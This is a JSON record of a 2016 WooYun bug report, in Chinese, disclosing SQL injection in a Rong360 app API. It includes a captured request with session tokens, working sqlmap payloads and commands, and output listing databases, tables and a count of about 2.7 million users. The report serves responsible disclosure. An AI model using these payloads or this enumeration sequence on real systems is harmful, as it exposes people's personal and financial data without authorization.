{"id": 85539, "wybug_id": "wooyun-2016-0172514", "wybug_title": "融360某站点Mysql注射漏洞", "wybug_corp": "融360", "wybug_author": "隔壁老三", "wybug_date": "2016-01-25 10:51", "wybug_open_date": "2016-03-08 21:29", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-08：\t细节向公众公开  简要描述： RT，过年了。赏个红包呗 详细说明：  RT下了一个融360APP准备研究逻辑漏洞的，结果测试时发现了注入。。。   漏洞证明：  手机抓包得到POST /zhigou/mapi/appv10/auth HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 653Host: bigapp.rong360.comConnection: Keep-AliveAccept-Encoding: gzipCookie: __utmz=1453638415.utmcsr=(direct)|utmcmd=(direct); RONGID=f21fc42fceb01a1542fedc818091b45d; abclass=1453638415_4User-Agent: okhttp/2.5.0uid=3727626&sec_level=1&ticket=823d7601af2a06e8&data=mJDI0Ls2ZInhD4LC6AtxRijS8FK35rlFb52ANMMaSJrVX1rwUGXVXt8ZBEzikMLruB2QazU23ia22NYDAeVLD5USB4yeSjzDRCf%2FAIiSYrDwa3I7%2FpHKk9KYblt2Y9D6QiGYPXEv4UaLM6Y1xHf56%2B5SoVdOltc2UGHXSSETf1jbkL3N2bovXma4F0ZGZGEfv3HIsrXABCn7%2BrTL31OvX3byWdF02bBZSRKwJJbHOXmUoTlHb9TcRELVmVzHil2a1U8Ef2NKLw4qeb5Zh4J1C9%2BAD9Li9hepsmjOG6AIZKSUgEnDkFe1dnFII4QkIhEMEPzUtR2eBhU26QgAX26Oe0yMGmXDlsAR%2FpKqp15Haf5OM058pa3Qsk5KPkWFpv1mFg%2FCE74AoEXTLy934fqZX3cXsvTFo6TjzLpPX6wnj3TrorhhRHfCZvG8JFQ%2FrUQayjQ8UxkHL4ukaZHV%2BnnOuhzjZNabtGBFDpri3foY3ThsA1KAe0OrwaoZfD%2FrBLckZXLfVs0cc3KBDIP4QDXhzzEHeH3Nu2hxKWOPOhQSNwAY3uPM189%2Fe33%2FP48LuYnpuid处存在注入将该包保存到sqlmap目录下命名为test1.txt开sqlmap输入-r test1.txt --dbs得到sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: uid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: uid=3727626' AND 5662=5662 AND 'Yzph'='Yzph&sec_level=1&ticket=823d7601af2a06e8&data=mJDI0Ls2ZInhD4LC6AtxRijS8FK35rlFb52ANMMaSJrVX1rwUGXVXt8ZBEzikMLruB2QazU23ia22NYDAeVLD5USB4yeSjzDRCf/AIiSYrDwa3I7/pHKk9KYblt2Y9D6QiGYPXEv4UaLM6Y1xHf56+5SoVdOltc2UGHXSSETf1jbkL3N2bovXma4F0ZGZGEfv3HIsrXABCn7+rTL31OvX3byWdF02bBZSRKwJJbHOXmUoTlHb9TcRELVmVzHil2a1U8Ef2NKLw4qeb5Zh4J1C9+AD9Li9hepsmjOG6AIZKSUgEnDkFe1dnFII4QkIhEMEPzUtR2eBhU26QgAX26Oe0yMGmXDlsAR/pKqp15Haf5OM058pa3Qsk5KPkWFpv1mFg/CE74AoEXTLy934fqZX3cXsvTFo6TjzLpPX6wnj3TrorhhRHfCZvG8JFQ/rUQayjQ8UxkHL4ukaZHV+nnOuhzjZNabtGBFDpri3foY3ThsA1KAe0OrwaoZfD/rBLckZXLfVs0cc3KBDIP4QDXhzzEHeH3Nu2hxKWOPOhQSNwAY3uPM189/e33/P48LuYnp    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: uid=3727626' AND SLEEP(5) AND 'ARFR'='ARFR&sec_level=1&ticket=823d7601af2a06e8&data=mJDI0Ls2ZInhD4LC6AtxRijS8FK35rlFb52ANMMaSJrVX1rwUGXVXt8ZBEzikMLruB2QazU23ia22NYDAeVLD5USB4yeSjzDRCf/AIiSYrDwa3I7/pHKk9KYblt2Y9D6QiGYPXEv4UaLM6Y1xHf56+5SoVdOltc2UGHXSSETf1jbkL3N2bovXma4F0ZGZGEfv3HIsrXABCn7+rTL31OvX3byWdF02bBZSRKwJJbHOXmUoTlHb9TcRELVmVzHil2a1U8Ef2NKLw4qeb5Zh4J1C9+AD9Li9hepsmjOG6AIZKSUgEnDkFe1dnFII4QkIhEMEPzUtR2eBhU26QgAX26Oe0yMGmXDlsAR/pKqp15Haf5OM058pa3Qsk5KPkWFpv1mFg/CE74AoEXTLy934fqZX3cXsvTFo6TjzLpPX6wnj3TrorhhRHfCZvG8JFQ/rUQayjQ8UxkHL4ukaZHV+nnOuhzjZNabtGBFDpri3foY3ThsA1KAe0OrwaoZfD/rBLckZXLfVs0cc3KBDIP4QDXhzzEHeH3Nu2hxKWOPOhQSNwAY3uPM189/e33/P48LuYnp---available databases [3]:[*] information_schema[*] r360_passport[*] test接着-r test1.txt --tables -D \"r360_passport\"得到Database: r360_passport[2 tables]+--------------------+| user_info          || user_login_history |+--------------------+此时count命令看下一下数量   如图所示~~~用户信息2727054。--------------270万再跑不下user_info看看都有哪些用户信息-r test1.txt --column -T \"user_info\" -D \"r360_passport\"得到如图读取username时发现部分用户可以使用微信微博直接登录。。。\n\n\n\n\n\n\n\n数据量大，金融行业不脱裤不深入，就到这了。   修复方案：  你懂的   版权声明：转载请注明来源 隔壁老三@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-25 11:24 厂商回复： 多谢您对融360的关注,我们的工程师已经在处理了 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}